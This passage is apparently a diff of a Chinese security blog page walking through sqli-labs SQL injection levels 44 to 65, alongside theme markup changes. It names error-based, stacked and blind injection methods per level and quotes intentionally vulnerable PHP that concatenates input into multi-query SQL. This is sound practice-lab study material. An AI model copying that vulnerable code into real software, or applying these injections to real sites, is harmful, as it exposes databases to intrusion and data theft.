 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$username</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br><span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>
 
 <h3 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h3><p>同level42</p>
-<p><img src="/2023/02/09/SQLI/image-20230815023355034.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815023355034.png"></p>
 <h3 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h3><p>同43</p>
 <h3 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h3><p>一进来这样一个页面，传入sort参数发现数据的顺序改变，推测是传入参数拼接在了order by后面，那就不能联合注入了，看了眼源代码不是用<code>multi_query()</code>，那也没办法堆叠注入了，</p>
-<p><img src="/2023/02/09/SQLI/image-20230815215204733.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815215204733.png"></p>
 <p>想了想还是用报错注入，<code>updatexml()</code></p>
-<p><img src="/2023/02/09/SQLI/image-20230815220041006.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230815220041006.png"></p>
 <h3 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h3><p>比起上一题多了个单引号闭合：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816003152422.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816003152422.png"></p>
 <h3 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h3><p>没有报错信息，判断为数字型，注入点在order by 后，延时注入：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816003708096.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816003708096.png"></p>
 <h3 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h3><p>引号闭合，但是无报错信息，延时注入</p>
 <h3 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h3><p>可报错注入也可堆叠注入：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>       ......<br>   	<span class="hljs-keyword">else</span><br>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br>	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure>
@@ -871,382 +482,82 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure>
 
 <h3 id="level54"><a href="#level54" class="headerlink" title="level54"></a>level54</h3><p>被限定了次数，十次以内要获得secret_key</p>
-<p><img src="/2023/02/09/SQLI/image-20230816013349810.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816013349810.png"></p>
 <p>爆表名：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816013546447.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816013546447.png"></p>
 <p>字段名：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816013657232.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816013657232.png"></p>
 <p>那么我们目标的应该就是secret_P551字段中的东西了，爆数据：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816013833474.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816013833474.png"></p>
 <h3 id="level55"><a href="#level55" class="headerlink" title="level55"></a>level55</h3><p>有14次机会</p>
-<p><img src="/2023/02/09/SQLI/image-20230816185347159.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816185347159.png"></p>
 <p>括号闭合整数：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
 
 <h3 id="level56"><a href="#level56" class="headerlink" title="level56"></a>level56</h3><p>单引号+括号闭合：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816185906878.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816185906878.png"></p>
 <h3 id="level57"><a href="#level57" class="headerlink" title="level57"></a>level57</h3><p>双引号闭合</p>
-<p><img src="/2023/02/09/SQLI/image-20230816190011961.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816190011961.png"></p>
 <h3 id="level58"><a href="#level58" class="headerlink" title="level58"></a>level58</h3><p>使用单引号闭合报错注入</p>
-<p><img src="/2023/02/09/SQLI/image-20230816193015731.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816193015731.png"></p>
 <h3 id="level59"><a href="#level59" class="headerlink" title="level59"></a>level59</h3><p>整数闭合，报错注入：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816193218467.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816193218467.png"></p>
 <h3 id="level60"><a href="#level60" class="headerlink" title="level60"></a>level60</h3><p>双引号+括号报错注入：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816193816781.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816193816781.png"></p>
 <h3 id="level61"><a href="#level61" class="headerlink" title="level61"></a>level61</h3><p>单引号+双括号闭合：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816194208635.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816194208635.png"></p>
 <h3 id="level62"><a href="#level62" class="headerlink" title="level62"></a>level62</h3><p>单引号+括号闭合，无报错结果，可布尔可时间盲注</p>
-<p><img src="/2023/02/09/SQLI/image-20230816194849144.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230816195044179.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816194849144.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230816195044179.png"></p>
 <h3 id="level63"><a href="#level63" class="headerlink" title="level63"></a>level63</h3><p>单引号，无报错信息，布尔盲注or时间盲注：</p>
-<p><img src="/2023/02/09/SQLI/image-20230816195219052.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230816195232417.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230816195219052.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230816195232417.png"></p>
 <h3 id="level64"><a href="#level64" class="headerlink" title="level64"></a>level64</h3><p>整数+双括号闭合，布尔or时间盲注</p>
-<p><img src="/2023/02/09/SQLI/image-20230816195607490.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="level65"><a href="#level65" class="headerlink" title="level65"></a>level65</h3><p>双引号+括号闭合，布尔or时间盲注<img src="/2023/02/09/SQLI/image-20230816195718057.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230816195806826.png" srcset="/img/loading.gif" lazyload></p>
-
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="category-chain-item">常见漏洞</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/">#Web</a>
-      
-        <a href="/tags/sqli/">#sqli</a>
-      
-    </div>
-  
-</div>
-
-
-              
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">文件上传</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/02/09/XSS/" title="XSS">
-                        <span class="hidden-mobile">XSS</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
-
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  
-<script src="/js/click.js"></script>
-<script src="/js/snow.js"></script>
-<script src="/js/potato.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
-</body>
-</html>
+<p><img src="/2023/02/09/SQLI/image-20230816195607490.png"></p>
+<h3 id="level65"><a href="#level65" class="headerlink" title="level65"></a>level65</h3><p>双引号+括号闭合，布尔or时间盲注<img src="/2023/02/09/SQLI/image-20230816195718057.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230816195806826.png"></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>SQLI</p><p><a href="http://example.com/2023/02/09/SQLI/">http://example.com/2023/02/09/SQLI/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-02-09</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-01-10</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/sqli/">sqli</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">文件上传</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/02/09/XSS/"><span class="level-item">XSS</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/icon.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">This is Potato&#039;s blog~</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">34</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">17</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Potatowo233" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/01/"><span class="level-start"><span class="level-item">一月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/10/"><span class="level-start"><span class="level-item">十月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">七月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">三月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">二月 2023</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Docker/"><span class="tag">Docker</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Misc/"><span class="tag">Misc</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqli/"><span class="tag">sqli</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssti/"><span class="tag">ssti</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"><span class="tag">正则表达式</span><span class="tag">1</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">做题记录</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">学习记录</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"><span class="level-start"><span class="level-item">Docker</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"><span class="level-start"><span class="level-item">渗透工具</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"><span class="level-start"><span class="level-item">自建靶场</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">常见漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"><span class="level-start"><span class="level-item">Web漏洞</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-07T04:46:48.000Z">2024-01-07</time></p><p class="title"><a href="/2024/01/07/Vim%E5%AD%A6%E4%B9%A0/">Vim学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-01-01T08:06:34.000Z">2024-01-01</time></p><p class="title"><a href="/2024/01/01/16-PHP-Magic-Methods/">16_PHP_Magic_Methods</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:46:17.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/">CVE-2023-47130分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-29T18:19:30.000Z">2023-12-30</time></p><p class="title"><a href="/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/">CVE-2023-41892分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-12-23T13:38:37.000Z">2023-12-23</time></p><p class="title"><a href="/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">记一次CMS代码审计</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p 